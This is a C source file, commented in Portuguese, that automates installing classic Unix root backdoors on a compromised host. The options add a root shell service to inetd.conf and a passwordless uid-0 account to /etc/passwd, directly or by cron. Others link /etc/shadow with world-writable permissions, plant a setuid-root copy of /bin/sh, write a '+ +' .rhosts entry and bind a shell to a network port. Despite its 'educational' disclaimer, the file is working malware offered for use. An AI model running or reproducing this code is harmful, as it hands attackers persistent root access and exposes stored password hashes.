/* SIMPLES PROGRAMA AUTOMATIZADOR DE BACKDOORS ULTRAPASSADAS.
   EXECUTA E INSTALA ALGUMAS DAS MAIS CONHECIDAS BACKDOORS.
   DESENVOLVIDO POR NASHLEON VULGO CORACAODELEAO.
   nashleon@yahoo.com.br
   Thanks Unsekurity Team.
   http://unsekurity.virtualave.net/
   OBS: Este programa possui propositos educacionais.Foi Escrito
	para demonstracao de teorias de backdoors.Leia o tutorial
	sobre backdoors e trojans horses na home page citada acima
	para que possa entender os processos.Lembrando que o autor
	deste programa nao se responsabiliza pelo mau uso do mesmo.
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

#define ERRO -1

int inetd();
int crond();
int passw();
int forward();
int suid();
int rlog();
int binda();
void uso(char *nome);

FILE *arquivo;

main(int argc, char *argv[])
{
        char *opcao;
        if (argc != 2)
        {
                uso(argv[0]);
                exit(0);
        }
        if (geteuid() != 0)
        {
                printf("Voce nao eh root mano!!\n");
                printf("Nesse Esquema voce necessita ser!!\n");
                printf("Leia tutorial sobre Backdoor e Trojans Horse!!\n");
                exit(ERRO);
        }
        opcao = argv[1];
        if (!strcmp(opcao, "inetd"))
        {
                inetd();
        }
        if (!strcmp(opcao, "crond"))
        {
                crond();
        }
        if (!strcmp(opcao, "passw"))
        {
                passw();
        }
        if (!strcmp(opcao, "fowar"))
        {
                forward();
        }
        if (!strcmp(opcao, "suid"))
        {
                suid();
        }
        if (!strcmp(opcao, "rlog"))
        {
                rlog();
        }
        if (!strcmp(opcao, "binda"))
        {
                binda();
        }
        if (!strcmp(opcao, "todas"))
        {
                system("clear");
                printf("***** Instalando Todas As Backdoors *****\n\n");
                inetd();
                crond();
                passw();
                forward();
                suid();
                rlog();
                binda(argv[0], argv[1]);
                printf("\n\n*** Todas as Backdoors Foram Instaladas com Sucesso!! ***\n");
        }
}
void uso(char *nome)
{
        system("clear");
        printf("****************** NL - AUTOMATIZADOR DE BACKDOORS ******************\n");
        printf("\nUso: %s <tipo>\n\n", nome);
        printf("Onde tipo pode ser:\n");
        printf("inetd -> Acrescenta backdoor no /etc/inetd.conf.\n");
        printf("crond -> Acrescenta backdoor via crond.\n");
        printf("passw -> Acrescenta usuario uid 0 e gid 0 no /etc/passwd.\n");
        printf("fowar -> Linka /etc/passwd a um arquivo .foward.\n");
        printf("suid  -> Copia uma shell(/bin/sh) com suid root.\n");
        printf("rlog  -> Cria arquivo .rhosts para rlogin.\n");
        printf("binda -> Binda uma shell a uma determinada porta.\n");
        printf("todas -> Instala todas as backdoors acima citadas.\n\n");
        exit(0);
}
int inetd()
{
        char nome[20], coloca[50];
        printf("**** Instalando Backdoor no inetd ****\n\n");
        printf("Digite o nome do processo ou o numero da porta a acoplar: ");
        scanf("%s", &nome);
        sprintf(coloca, "%s\tstream\ttcp\tnowait\troot\t/bin/sh\tsh\n", nome);
        arquivo = fopen("/etc/inetd.conf", "a+");
        if (arquivo == NULL)
        {
                fprintf(stderr, "Erro na abertura do arquivo!\n");
                exit(ERRO);
        }
        fputs(coloca, arquivo);
        fclose(arquivo);
        if (fork() == 0)
        {
                execl("/bin/killall", "killall", "-1", "inetd", 0);
        }
        printf("Backdoor Instalada com Sucesso!!\n\n");
}

int crond()
{
        char hora[5], dia[5], mes[5], minuto[5], semana[5];
        char coloca1[30], coloca2[40], coloca3[60], resposta[4], user[20];
        char comando[50];
        printf("**** Agendando crond para Executar uma backdoor ****\n\n");
        printf("Digite o mes q vc quer q seja aberta a back(* p/ todos): ");
        scanf("%s", &mes);
        printf("Digite o dia q vc quer q seja aberta a back(* p/ todos): ");
        scanf("%s", &dia);
        printf("Digite a hora q vc quer q seja aberta a back(0 a 23): ");
        scanf("%s", &hora);
        printf("Digite o minuto q vc quer q seja aberta a back(0 a 59): ");
        scanf("%s", &minuto);
        printf("Digite o dia da semana, caso queira(0 a 6) ou (* p/ todos): ");
        scanf("%s", &semana);
        sprintf(coloca1, "%s %s %s %s %s", minuto, hora, dia, mes, semana);
        printf("Voce quer que seja acrescentado um user no passwd(s/n)? ");
        scanf("%s", &resposta);
        if (!strcmp(resposta, "s"))
        {
                printf("Digite o nome do usuario a ser acrescentado: ");
                scanf("%s", &user);
                sprintf(coloca2, "/bin/echo \"%s::0:0::/:/bin/sh\" >> /etc/passwd", user);
                arquivo = fopen("./cronjobs", "a+");
                if (arquivo == NULL)
                {
                        printf("Erro ao abrir o arquivo para escrita\n");
                        exit(ERRO);
                }
                sprintf(coloca3, "%s %s", coloca1, coloca2);
                fputs(coloca3, arquivo);
                fclose(arquivo);
                if (fork() == 0)
                {
                        execl("/usr/bin/crontab", "crontab", "cronjobs", 0);
                }
                printf("Backdoor Executada com Sucesso!!\n\n");
        }
        else
        {
                printf("Digite o comando que quer executar: ");
                scanf("%s", &comando);
                sprintf(coloca3, "%s %s", coloca1, comando);
                arquivo = fopen("./cronjobs", "a+");
                if (arquivo == NULL)
                {
                        printf("Erro ao abrir o arquivo para escrita.\n");
                        exit(ERRO);
                }
                fputs(coloca3, arquivo);
                fclose(arquivo);
                if (fork() == 0)
                {
                        execl("/usr/bin/crontab", "crontab", "cronjobs", 0);
                }
                printf("Backdoor Executada com Sucesso!!\n\n");
        }
}
int passw()
{
        char login[20], coloca[50];
        printf("**** Instalando Backdoor do passwd ****\n\n");
        printf("Digite o login que deseja acrescentar: ");
        scanf("%s", &login);
        sprintf(coloca, "%s::0:0::/:/bin/sh", login);
        arquivo = fopen("/etc/passwd", "a+");
        if (arquivo == NULL)
        {
                printf("Erro ao abrir o arquivo passwd(/etc/passwd).\n");
                exit(ERRO);
        }
        fputs(coloca, arquivo);
        fclose(arquivo);
        printf("Backdoor Instalada com Sucesso!!\n\n");
}

int forward()
{
        char diretorio[30], arquivo[20], path[40], argumento[10];
        printf("**** Linkando /etc/shadow para arquivo .forward ****\n\n");
        printf("Digite o Diretorio aonde quer linkar o shadow: ");
        scanf("%s", &diretorio);
        sprintf(path, "%s/.forward", diretorio);
        strcpy(argumento, "4777");
        /* Obs: Se for Red Sux sem shadow, altere abaixo */
        strcpy(arquivo, "/etc/shadow");
        if (fork() == 0)
        {
                execl("/bin/ln", "ln", arquivo, path, 0);
        }
        if (fork() == 0)
        {
                execl("/bin/chmod", "chmod", argumento, path, 0);
        }
        printf("Arquivo Linkado com Sucesso!!\n\n");
}

int suid()
{
        char diretorio[30], shell[20], argumento[10];
        printf("**** Copiando Shell com suid root ****\n\n");
        printf("Digite o PATH(Ex:/tmp/shell) que  quer que seja copiada a shell: ");
        scanf("%s", &diretorio);
        strcpy(shell, "/bin/sh");
        strcpy(argumento, "04777");
        if (fork() == 0)
        {
                execl("/bin/cp", "cp", shell, diretorio, 0);
        }
        if (fork() == 0)
        {
                execl("/bin/chmod", "chmod", argumento, diretorio, 0);
        }
        printf("Shell Copiada com Sucesso!!\n\n");
}
int rlog()
{
        char dire[40], path[50], escreve[10];
        printf("**** Instalando Backdoor Para rlogin ****\n\n");
        printf("Digite o diretorio home para instalar arquivo: ");
        scanf("%s", &dire);
        sprintf(path, "%s/.rhosts", dire);
        strcpy(escreve, "+ +");
        arquivo = fopen(path, "a+");
        if (arquivo == NULL)
        {
                fprintf(stderr, "Erro na Abertura do Arquivo!\n");
                exit(ERRO);
        }
        fputs(escreve, arquivo);
        fclose(arquivo);
        printf("Backdoor Instalada com Sucesso!!\n\n");
}

int binda()
{
        int porta;
        int Meusocket;
        int tamanho, conector;
        struct sockaddr_in hacker;
        struct sockaddr_in vitima;
        char engana[50];

        printf("**** Instalando Backdoor Bind Shell!! ****\n\n");
        printf("Digite o Numero da Porta Para Bindar a Shell: ");
        scanf("%d", &porta);
        if (fork() == 0)
        {
                vitima.sin_family = AF_INET;
                vitima.sin_addr.s_addr = htonl(INADDR_ANY);
                vitima.sin_port = htons(porta);
                bzero(&(vitima.sin_zero), 8);
                Meusocket = socket(AF_INET, SOCK_STREAM, 0);
                if (Meusocket < 0)
                {
                        fprintf(stderr, "Erro em socket()!\n");
                        exit(ERRO);
                }
                bind(Meusocket, (struct sockaddr *)&vitima, sizeof(vitima));
                if (bind < 0)
                {
                        fprintf(stderr, "Erro em bind()!\n");
                        exit(ERRO);
                }
                listen(Meusocket, 2);
                tamanho = sizeof(hacker);
                conector = accept(Meusocket, (struct sockaddr *)&hacker, &tamanho);
                if (conector < 0)
                {
                        fprintf(stderr, "Erro em accept()!\n");
                }
                dup2(conector, 0);
                dup2(conector, 1);
                dup2(conector, 2);
                execl("/bin/sh", "sh", 0);
        }
        printf("\n**** Backdoor Instalada com Sucesso!! *****\n\n");
}
